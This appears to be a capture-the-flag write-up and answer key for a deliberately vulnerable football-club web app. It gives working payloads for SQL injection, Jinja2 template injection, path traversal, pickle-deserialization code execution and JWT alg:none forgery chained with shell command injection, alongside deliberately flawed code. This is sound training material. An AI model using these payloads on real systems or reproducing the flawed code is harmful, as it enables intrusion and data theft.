# Man City FC — Writeup

## Flag 1 (Easy) — HTML Source Comment

**CWE-615: Inclusion of Sensitive Information in Source Code Comments**

1. Open `http://HOST:8018/`
2. View page source (Ctrl+U)
3. Near the bottom, find:
   ```html
   <!-- Debug: internal flag for testing = INFODAYS{...} -->
   ```

---

## Flag 2 (Easy) — robots.txt Exposure

**CWE-200: Exposure of Sensitive Information**

1. Navigate to `http://HOST:8018/robots.txt`
2. Note the `Disallow: /backup/` entry
3. Browse to `http://HOST:8018/backup/`
4. Directory listing reveals the flag

---

## Flag 3 (Medium) — Default Credentials

**CWE-798: Use of Hard-coded Credentials**

1. Go to `/login`
2. Try common defaults: `admin:admin123`
3. Dashboard reveals the admin flag

Credentials in the DB:
- `admin:admin123` (admin role)
- `scout:scout2026` (viewer role)
- `manager:guardiola` (manager role)

---

## Flag 4 (Medium) — SQL Injection

**CWE-89: SQL Injection**

The `/search?q=` endpoint uses raw string interpolation:
```python
query = f"SELECT id, name, position, number FROM players WHERE name LIKE '%{q}%'"
```

Exploit:
```
/search?q=' UNION SELECT id, key, value, id FROM secrets--
```

This dumps the `secrets` table which contains flag4.

---

## Flag 5 (Hard) — Server-Side Template Injection

**CWE-1336: SSTI**

The `/player/bio` endpoint renders user input through `render_template_string`:
```python
template = f"... Nickname: {nickname} ..."
output = render_template_string(template)
```

Exploit — read environment variable via Jinja2 globals:
```
{{lipsum.__globals__['os'].environ.get('FLAG5')}}
```

Alternative payloads:
```
{{cycler.__init__.__globals__['os'].environ['FLAG5']}}
{{request.__class__.__mro__[1].__subclasses__()}}  (enumerate classes first)
```

---

## Flag 6 (Hard) — Path Traversal / LFI

**CWE-22: Path Traversal**

The `/download?file=` endpoint joins user input with the reports directory
without sanitization:
```python
filepath = REPORTS / filename
```

Exploit:
```
/download?file=../flag6.txt
```

The flag file is one directory up from `reports/`.

---

## Flag 7 (Insane) — Pickle Deserialization RCE

**CWE-502: Deserialization of Untrusted Data**

The `/preferences` endpoint loads a `prefs` cookie via `pickle.loads()`:
```python
prefs = pickle.loads(base64.b64decode(cookie))
```

Craft a malicious pickle that returns a valid prefs dict with the flag
embedded in the `theme` field (so the template renders it):
```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        return (eval, ("{'theme':__import__('os').environ.get('FLAG7','x'),"
                       "'lang':'en','notifications':True}",))

cookie = base64.b64encode(pickle.dumps(Exploit())).decode()
print(cookie)
```

Send the cookie:
```bash
curl -b "prefs=<payload>" http://HOST:8018/preferences
```

The page renders `Current: theme=INFODAYS{...}` at the bottom, leaking
the flag through the deserialized theme value.

---

## Flag 8 (Extreme Insane) — JWT alg:none + Command Injection

**CWE-347: Improper Verification of Cryptographic Signature + CWE-78: OS Command Injection**

Two chained vulnerabilities:

### Step 1: JWT Algorithm Confusion

The API docs (`/api/docs`) reveal:
- `/api/auth` issues JWT tokens
- `/api/export` requires `superadmin` role
- No user in the DB has `superadmin` role

The JWT decoder accepts `alg: none` and skips signature verification:
```python
if header.get("alg", "").lower() == "none":
    return payload  # no signature check
```

Forge a token:
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "hacker", "role": "superadmin"}).encode())
token = f"{header}.{payload}."
```

### Step 2: Command Injection

The `/api/export` endpoint passes the `format` parameter to a shell command:
```python
result = subprocess.check_output(
    f"echo Export format: {fmt} && cat /app/reports/*.txt",
    shell=True, ...
)
```

Inject:
```
GET /api/export?format=json;cat /app/flag8.txt
Authorization: Bearer <forged_token>
```

### Full exploit:

```bash
# Forge JWT
TOKEN=$(python3 -c "
import base64,json
def b(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
h=b(json.dumps({'alg':'none','typ':'JWT'}).encode())
p=b(json.dumps({'sub':'x','role':'superadmin'}).encode())
print(f'{h}.{p}.')
")

# RCE
curl -H "Authorization: Bearer $TOKEN" \
     "http://HOST:8018/api/export?format=json;cat%20/app/flag8.txt"
```

---

## Hint Ladder

1. *Free:* "Not everything visible in the browser is all there is. Check what
   the server sends that the browser doesn't render."
2. *Easy:* "Robots are helpful. What do they tell search engines to avoid?"
3. *Medium:* "The login page uses common defaults. What would a lazy admin pick?"
4. *Medium:* "The search box doesn't sanitize input. What if you spoke SQL?"
5. *Hard:* "The bio preview renders your input as a template. What does Jinja2
   evaluate between double curly braces?"
6. *Hard:* "The download endpoint trusts the filename. What happens if you go up?"
7. *Insane:* "The preferences cookie is a Python object. What serialization
   format lets you execute code on load?"
8. *Extreme:* "The API docs mention a role that no user has. JWT headers define
   the algorithm — what if you pick one that needs no key? Then the export
   endpoint runs a shell command with your input..."
